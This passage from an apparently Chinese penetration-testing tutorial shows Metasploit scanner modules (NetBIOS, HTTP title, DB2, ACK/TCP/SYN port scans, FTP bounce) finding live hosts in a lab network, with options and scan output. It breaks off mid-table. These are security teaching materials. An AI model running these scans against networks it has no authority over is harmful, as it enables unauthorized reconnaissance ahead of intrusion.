Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span> yes The target address range or CIDR identifier
RPORT <span class="token number">3306</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">3306</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">3306</span> is running MySQL <span class="token number">5.1</span><span class="token number">.52</span>‐community <span class="token punctuation">(</span>protocol <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100222340898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章:</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">24</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>msf<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji<span class="token operator">-</span>di<span class="token operator">-</span>er<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="543_MSF3_2137"></a>5.4.3 基于MSF发现内网存活主机（3）</h2>
<p>攻击机： 192.168.1.5 Debian 靶机： 192.168.1.2 Windows 7</p>
<p>192.168.1.115 Windows 2003</p>
<p>192.168.1.119 Windows 2003</p>
<p><strong>（1）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
</code></pre>
<p><strong>（2）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version
</code></pre>
<p><strong>（3）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp
</code></pre>
<p><strong>11、基于auxiliary/scanner/netbios/nbname发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BATCHSIZE <span class="token number">256</span> yes The number of hosts to probe in each set
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
RPORT <span class="token number">137</span> yes The target port <span class="token punctuation">(</span>UDP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending NetBIOS requests to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span>‐<span class="token operator">&gt;</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.255</span> <span class="token punctuation">(</span><span class="token number">256</span> hosts<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span> <span class="token punctuation">[</span>JOHN‐PC<span class="token punctuation">]</span> OS<span class="token punctuation">:</span>Windows Names<span class="token punctuation">:</span><span class="token punctuation">(</span>JOHN‐PC<span class="token punctuation">,</span> WORKGROUP<span class="token punctuation">,</span> __MSBROWSE__<span class="token punctuation">)</span> Addresses<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">192.168</span><span class="token number">.32</span><span class="token number">.1</span><span class="token punctuation">)</span>Mac<span class="token punctuation">:</span><span class="token number">4</span>c<span class="token punctuation">:</span>cc<span class="token punctuation">:</span><span class="token number">6</span>a<span class="token punctuation">:</span>e3<span class="token punctuation">:</span><span class="token number">51</span><span class="token punctuation">:</span><span class="token number">27</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span> <span class="token punctuation">[</span>VM_2003X86<span class="token punctuation">]</span> OS<span class="token punctuation">:</span>Windows Names<span class="token punctuation">:</span><span class="token punctuation">(</span>VM_2003X86<span class="token punctuation">,</span>WORKGROUP<span class="token punctuation">)</span> Addresses<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">)</span> Mac<span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>af<span class="token punctuation">:</span>ce<span class="token punctuation">:</span>cc Virtual Machine<span class="token punctuation">:</span>VMWare
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> <span class="token punctuation">[</span>WIN03X64<span class="token punctuation">]</span> OS<span class="token punctuation">:</span>Windows User<span class="token punctuation">:</span>ADMINISTRATOR Names<span class="token punctuation">:</span><span class="token punctuation">(</span>WIN03X64<span class="token punctuation">,</span> WORKGROUP<span class="token punctuation">,</span> ADMINISTRATOR<span class="token punctuation">)</span> Addresses<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">)</span>Mac<span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>d6<span class="token punctuation">:</span><span class="token number">7</span>d Virtual Machine<span class="token punctuation">:</span>VMWare
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223620487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>12、基于auxiliary/scanner/http/title发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
Proxies no A proxy chain of format type<span class="token punctuation">:</span>host<span class="token punctuation">:</span>port<span class="token punctuation">[</span><span class="token punctuation">,</span>type<span class="token punctuation">:</span>host<span class="token punctuation">:</span>port<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">,</span><span class="token number">119</span> yes The target address range or CIDR identifier
RPORT <span class="token number">80</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
SHOW_TITLES true yes Show the titles on the console as they are grabbed
SSL false no Negotiate SSL<span class="token operator">/</span>TLS <span class="token keyword">for</span> outgoing connections
STORE_NOTES true yes Store the captured information in notes<span class="token punctuation">.</span> Use <span class="token string">"no tes‐t http.title"</span> to view
TARGETURI <span class="token operator">/</span> yes The base path
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>C<span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>R<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>S<span class="token punctuation">:</span>Microsoft‐IIS<span class="token operator">/</span><span class="token number">6.0</span><span class="token punctuation">]</span> 协同管理系统
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">2</span> of <span class="token number">2</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223651141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>13、基于auxiliary/scanner/db2/db2_version发现db2服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
​
Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
DATABASE toolsdb yes The name of the target database
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
RPORT <span class="token number">50000</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">5</span> yes Timeout <span class="token keyword">for</span> the DB2 probe 
​
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223711223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>14、基于auxiliary/scanner/portscan/ack发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BATCHSIZE <span class="token number">256</span> yes The number of hosts to scan per set
DELAY <span class="token number">0</span> yes The delay between connections<span class="token punctuation">,</span> per thread<span class="token punctuation">,</span> in milliseconds
INTERFACE no The name of the interface
JITTER <span class="token number">0</span> yes The delay jitter factor <span class="token punctuation">(</span>maximum value by which to <span class="token operator">+</span><span class="token operator">/</span>‐ DELAY<span class="token punctuation">)</span> in milliseconds<span class="token punctuation">.</span>
PORTS <span class="token number">445</span> yes Ports to scan <span class="token punctuation">(</span>e<span class="token punctuation">.</span>g<span class="token punctuation">.</span> <span class="token number">22</span>‐<span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">110</span>‐<span class="token number">900</span><span class="token punctuation">)</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">,</span><span class="token number">119</span> yes The target address range or CIDR identifier
SNAPLEN <span class="token number">65535</span> yes The number of bytes to capture
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">500</span> yes The reply read timeout in milliseconds 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> TCP UNFILTERED <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">445</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> TCP UNFILTERED <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">445</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">2</span> of <span class="token number">2</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223734128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>15、基于auxiliary/scanner/portscan/tcp发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
CONCURRENCY <span class="token number">10</span> yes The number of concurrent ports to check per host
DELAY <span class="token number">0</span> yes The delay between connections<span class="token punctuation">,</span> per thread<span class="token punctuation">,</span> in milliseconds
JITTER <span class="token number">0</span> yes The delay jitter factor <span class="token punctuation">(</span>maximum value by which to <span class="token operator">+</span><span class="token operator">/</span>‐ DELAY<span class="token punctuation">)</span> in milliseconds<span class="token punctuation">.</span>
PORTS <span class="token number">445</span> yes Ports to scan <span class="token punctuation">(</span>e<span class="token punctuation">.</span>g<span class="token punctuation">.</span> <span class="token number">22</span>‐<span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">110</span>‐<span class="token number">900</span><span class="token punctuation">)</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">2</span> yes The target address range or CIDR identifier
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">1000</span> yes The socket connect timeout in milliseconds

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">:</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">445</span> ‐ TCP OPEN
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">3</span> hosts <span class="token punctuation">(</span><span class="token number">33</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">445</span> ‐ TCP OPEN
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">445</span> ‐ TCP OPEN
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">3</span> of <span class="token number">3</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002223756453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章:</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">25</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>msf<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji<span class="token operator">-</span>di<span class="token operator">-</span>san<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="544_MSF4_2302"></a>5.4.4 基于MSF发现内网存活主机（4）</h2>
<p>攻击机： 192.168.1.5 Debian</p>
<p>靶机： 192.168.1.2 Windows 7</p>
<p>192.168.1.115 Windows 2003</p>
<p>192.168.1.119 Windows 2003</p>
<p><strong>（1）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
</code></pre>
<p><strong>（2）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version
</code></pre>
<p><strong>（3）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp
</code></pre>
<p><strong>（4）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>syn 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ftpbounce
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>xmas 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smtp<span class="token operator">/</span>smtp_version
</code></pre>
<p><strong>16、基于auxiliary/scanner/portscan/syn发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>syn<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BATCHSIZE <span class="token number">256</span> yes The number of hosts to scan per set
DELAY <span class="token number">0</span> yes The delay between connections<span class="token punctuation">,</span> per thread<span class="token punctuation">,</span> in millisecond s
INTERFACE no The name of the interface
JITTER <span class="token number">0</span> yes The delay jitter factor <span class="token punctuation">(</span>maximum value by which to <span class="token operator">+</span><span class="token operator">/</span>‐ DELAY<span class="token punctuation">)</span> in milliseconds<span class="token punctuation">.</span>
PORTS <span class="token number">445</span> yes Ports to scan <span class="token punctuation">(</span>e<span class="token punctuation">.</span>g<span class="token punctuation">.</span> <span class="token number">22</span>‐<span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">110</span>‐<span class="token number">900</span><span class="token punctuation">)</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span> yes The target address range or CIDR identifier
SNAPLEN <span class="token number">65535</span> yes The number of bytes to capture
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">500</span> yes The reply read timeout in milliseconds 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>syn<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> TCP OPEN <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">445</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100222404361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>17、基于auxiliary/scanner/portscan/ftpbounce发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ftpbounce<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ftpbounce<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BOUNCEHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> yes FTP relay host
BOUNCEPORT <span class="token number">21</span> yes FTP relay port
DELAY <span class="token number">0</span> yes The delay between connections<span class="token punctuation">,</span> per thread<span class="token punctuation">,</span> in millisecond s
FTPPASS mozilla@example<span class="token punctuation">.</span>com no The password <span class="token keyword">for</span> the specified usernam e
FTPUSER anonymous no The username to authenticate as
JITTER <span class="token number">0</span> yes The delay jitter factor <span class="token punctuation">(</span>maximum value by which to <span class="token operator">+</span><span class="token operator">/</span>‐ DELAY<span class="token punctuation">)</span> in milliseconds<span class="token punctuation">.</span>
